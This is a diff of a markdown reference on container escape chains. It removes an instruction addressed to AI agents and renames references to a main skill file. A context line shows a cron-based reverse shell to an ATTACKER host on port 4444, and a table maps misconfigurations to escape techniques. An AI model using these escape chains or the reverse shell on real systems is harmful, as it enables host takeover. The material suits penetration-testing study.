@@ -1,7 +1,5 @@
 # Docker Escape Chains & Kubernetes Escape Paths
 
-> **AI LOAD INSTRUCTION**: Load this for step-by-step container escape chains covering common misconfigurations, Docker-in-Docker scenarios, and Kubernetes-specific escape sequences. Assumes the main [SKILL.md](./container-escape-techniques.md) is already loaded for fundamental escape techniques.
-
 ---
 
 ## 1. ESCAPE CHAIN: PRIVILEGED CONTAINER → HOST ROOT
@@ -287,10 +285,10 @@ echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /host/etc/cronta
 | `--privileged` + hostPID | nsenter -t 1 | §1.2 |
 | Docker socket mounted | Create privileged container | §2 |
 | CAP_SYS_ADMIN + cgroup v1 | release_agent write | §3 |
-| CAP_SYS_PTRACE + hostPID | Process injection | SKILL.md §3.2 |
-| CAP_DAC_READ_SEARCH | Shocker (open_by_handle_at) | SKILL.md §3.4 |
+| CAP_SYS_PTRACE + hostPID | Process injection | main document §3.2 |
+| CAP_DAC_READ_SEARCH | Shocker (open_by_handle_at) | main document §3.4 |
 | K8s SA with pod/create RBAC | Create privileged pod | §5.2 |
 | K8s hostPath volume | Read/write node filesystem | §5.3 |
 | Vulnerable kernel | Kernel exploit | linux-privilege-escalation |
-| Vulnerable runc (<1.0.0-rc6) | CVE-2019-5736 | SKILL.md §8 |
+| Vulnerable runc (<1.0.0-rc6) | CVE-2019-5736 | main document §8 |
 | DinD with host socket | Double-hop escape | §4.2 |
